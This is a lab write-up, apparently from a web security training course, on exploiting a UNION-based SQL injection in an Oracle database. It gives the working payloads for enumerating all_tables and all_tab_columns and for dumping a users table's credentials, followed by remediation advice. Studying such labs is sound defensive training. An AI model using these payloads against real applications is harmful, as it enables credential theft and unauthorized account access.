# Lab 06: SQL Injection - Listing Database Contents on Oracle

## 🎯 Objective
The goal of this lab was to exploit a SQL injection vulnerability to list the database contents on an Oracle database, extract the administrator's credentials from a hidden table, and log in to the application.

## 🔍 Vulnerability Description
The application is vulnerable to a UNION-based SQL injection. Unlike other databases, Oracle does not have an "information_schema" database. Instead, metadata about tables and columns is stored in system tables like "all_tables" and "all_tab_columns". Additionally, every SELECT statement in Oracle requires a FROM clause, so the built-in "dual" table is used when testing.

## 💥 Exploitation Steps
1. Confirmed the query returns 2 columns using ORDER BY.
2. Verified both columns accept text using the payload: ' UNION SELECT 'abc', 'def' FROM dual--
3. Queried the all_tables system table to find the target table name (e.g., USERS_ABCDEF).
Payload: ' UNION SELECT table_name, NULL FROM all_tables--
4. Queried the all_tab_columns system table to find the specific column names for usernames and passwords.
Payload: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
5. Extracted the credentials using the discovered table and column names.
Payload: ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--
6. Used the extracted administrator password to log in and solve the lab.

## ⚠️ Impact
An attacker can extract the entire database schema and dump sensitive information, such as user credentials, PII, and financial data. This leads to a complete breach of confidentiality and allows for account takeovers.

## 🛡️ Remediation (Blue Team Perspective)
Use Parameterized Queries (Prepared Statements) to separate code from data. Furthermore, restrict the database user's permissions so that the web application cannot read Oracle system tables like "all_tables" and "all_tab_columns", preventing schema enumeration.
